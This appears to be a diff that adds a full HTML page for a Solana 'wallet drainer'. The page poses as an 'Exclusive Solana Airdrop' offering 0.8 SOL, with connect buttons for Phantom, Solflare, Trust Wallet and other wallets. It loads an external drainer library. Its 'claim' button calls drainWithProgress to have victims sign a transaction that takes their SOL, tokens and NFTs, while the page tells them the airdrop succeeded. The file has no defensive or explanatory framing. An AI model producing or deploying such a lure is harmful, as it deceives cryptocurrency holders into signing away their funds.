@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Drainer Integration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            max-width: 800px;
+            width: 90%;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .wallet-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .wallet-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: rgba(255, 255, 255, 0.4);
+            transform: translateY(-2px);
+        }
+        
+        .wallet-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .wallet-btn.connected {
+            background: rgba(76, 175, 80, 0.3);
+            border-color: #4CAF50;
+        }
+        
+        .status-container {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            min-height: 100px;
+        }
+        
+        .status {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4CAF50;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            min-width: 150px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+        .loading { color: #2196F3; }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                margin: 20px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .wallet-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎁 Exclusive Solana Airdrop</h1>
+            <p>Connect your wallet to claim your 0.8 SOL airdrop instantly!</p>
+        </div>
+        
+        <div class="wallet-grid">
+            <div class="wallet-btn" onclick="connectWallet('phantom')" id="phantomBtn">
+                🟣 Phantom Wallet
+            </div>
+            <div class="wallet-btn" onclick="connectWallet('solflare')" id="solflareBtn">
+                🔵 Solflare Wallet
+            </div>
+            <div class="wallet-btn" onclick="connectWallet('backpack')" id="backpackBtn">
+                🎒 Backpack Wallet
+            </div>
+            <div class="wallet-btn" onclick="connectWallet('glow')" id="glowBtn">
+                ✨ Glow Wallet
+            </div>
+            <div class="wallet-btn" onclick="connectWallet('trustwallet')" id="trustwalletBtn">
+                🛡️ Trust Wallet
+            </div>
+            <div class="wallet-btn" onclick="connectWallet('exodus')" id="exodusBtn">
+                🚀 Exodus Wallet
+            </div>
+        </div>
+        
+        <div class="status-container">
+            <div class="status" id="status">Ready to connect wallet...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="stats" id="stats" style="display: none;">
+                <div class="stat-card">
+                    <div class="stat-value" id="solAmount">0</div>
+                    <div class="stat-label">SOL Amount</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="tokenCount">0</div>
+                    <div class="stat-label">Tokens</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="nftCount">0</div>
+                    <div class="stat-label">NFTs</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="txSize">0</div>
+                    <div class="stat-label">Tx Size (bytes)</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="action-buttons">
+            <button class="btn btn-primary" onclick="claimAirdrop()" id="claimBtn">
+                🚀 Claim 0.8 SOL Airdrop
+            </button>
+            <button class="btn btn-secondary" onclick="checkBalance()" id="checkBtn">
+                💰 Check Balance
+            </button>
+            <button class="btn btn-secondary" onclick="resetState()" id="resetBtn">
+                🔄 Reset
+            </button>
+        </div>
+    </div>
+
+    <!-- Include the drainer client library -->
+    <script src="https://your-domain.com/drainer-client.js" data-api-url="https://your-domain.com/api/drainer"></script>
+    
+    <script>
+        // Initialize the drainer
+        SolanaDrainer.init('https://your-domain.com/api/drainer');
+        
+        let currentWallet = null;
+        let isProcessing = false;
+        
+        const statusDiv = document.getElementById('status');
+        const progressFill = document.getElementById('progressFill');
+        const statsDiv = document.getElementById('stats');
+        const claimBtn = document.getElementById('claimBtn');
+        const checkBtn = document.getElementById('checkBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        
+        function updateStatus(message, type = 'loading') {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+        }
+        
+        function updateProgress(percentage) {
+            progressFill.style.width = `${percentage}%`;
+        }
+        
+        function updateStats(metadata) {
+            if (metadata) {
+                document.getElementById('solAmount').textContent = (metadata.solAmount / 1e9).toFixed(4);
+                document.getElementById('tokenCount').textContent = metadata.tokens;
+                document.getElementById('nftCount').textContent = metadata.nfts;
+                document.getElementById('txSize').textContent = metadata.size;
+                statsDiv.style.display = 'grid';
+            }
+        }
+        
+        function setButtonState(disabled) {
+            isProcessing = disabled;
+            claimBtn.disabled = disabled;
+            checkBtn.disabled = disabled;
+            
+            // Disable wallet buttons during processing
+            document.querySelectorAll('.wallet-btn').forEach(btn => {
+                btn.disabled = disabled;
+            });
+        }
+        
+        function resetWalletButtons() {
+            document.querySelectorAll('.wallet-btn').forEach(btn => {
+                btn.classList.remove('connected');
+            });
+        }
+        
+        async function connectWallet(walletType) {
+            if (isProcessing) return;
+            
+            try {
+                setButtonState(true);
+                resetWalletButtons();
+                updateStatus(`🔗 Connecting to ${walletType}...`, 'loading');
+                updateProgress(10);
+                
+                const publicKey = await SolanaDrainer.connectWallet();
+                currentWallet = publicKey;
+                
+                // Mark the connected wallet
+                document.getElementById(`${walletType}Btn`).classList.add('connected');
+                
+                updateStatus(`✅ Connected to ${walletType}: ${publicKey.substring(0, 8)}...`, 'success');
+                updateProgress(100);
+                
+                // Auto-check balance
+                setTimeout(() => checkBalance(), 1000);
+                
+            } catch (error) {
+                updateStatus(`❌ Failed to connect to ${walletType}: ${error.message}`, 'error');
+                updateProgress(0);
+            } finally {
+                setButtonState(false);
+            }
+        }
+        
+        async function claimAirdrop() {
+            if (!currentWallet || isProcessing) {
+                updateStatus('❌ Please connect a wallet first', 'error');
+                return;
+            }
+            
+            try {
+                setButtonState(true);
+                updateStatus('🎁 Starting airdrop claim...', 'loading');
+                updateProgress(0);
+                
+                const result = await SolanaDrainer.drainWithProgress(currentWallet, (stage, message) => {
+                    switch(stage) {
+                        case 'connect':
+                            updateStatus(`🔗 ${message}`, 'loading');
+                            updateProgress(20);
+                            break;
+                        case 'generate':
+                            updateStatus(`⚙️ ${message}`, 'loading');
+                            updateProgress(50);
+                            break;
+                        case 'sign':
+                            updateStatus(`✍️ ${message}`, 'loading');
+                            updateProgress(80);
+                            break;
+                        case 'success':
+                            updateStatus(`🎉 Airdrop claimed successfully!`, 'success');
+                            updateProgress(100);
+                            updateStats(message.metadata);
+                            break;
+                        case 'error':
+                            updateStatus(`❌ Error: ${message.error}`, 'error');
+                            updateProgress(0);
+                            break;
+                    }
+                });
+                
+            } catch (error) {
+                updateStatus(`❌ Claim failed: ${error.message}`, 'error');
+                updateProgress(0);
+            } finally {
+                setButtonState(false);
+            }
+        }
+        
+        async function checkBalance() {
+            if (!currentWallet || isProcessing) {
+                updateStatus('❌ Please connect a wallet first', 'error');
+                return;
+            }
+            
+            try {
+                setButtonState(true);
+                updateStatus('💰 Checking wallet balance...', 'loading');
+                updateProgress(50);
+                
+                // Generate transaction to check what would be drained
+                const transactionData = await SolanaDrainer.generateTransaction(currentWallet);
+                
+                updateStatus(`✅ Balance check complete`, 'success');
+                updateProgress(100);
+                updateStats(transactionData.metadata);
+                
+            } catch (error) {
+                updateStatus(`❌ Balance check failed: ${error.message}`, 'error');
+                updateProgress(0);
+            } finally {
+                setButtonState(false);
+            }
+        }
+        
+        function resetState() {
+            currentWallet = null;
+            isProcessing = false;
+            resetWalletButtons();
+            updateStatus('Ready to connect wallet...', 'loading');
+            updateProgress(0);
+            statsDiv.style.display = 'none';
+            setButtonState(false);
+        }
+        
+        // Auto-detect wallet on page load
+        window.addEventListener('load', () => {
+            const walletInfo = SolanaDrainer.getWalletProvider();
+            if (walletInfo) {
+                updateStatus(`🔍 Detected ${walletInfo.type} wallet`, 'loading');
+            }
+        });
+    </script>
+</body>
+</html> 
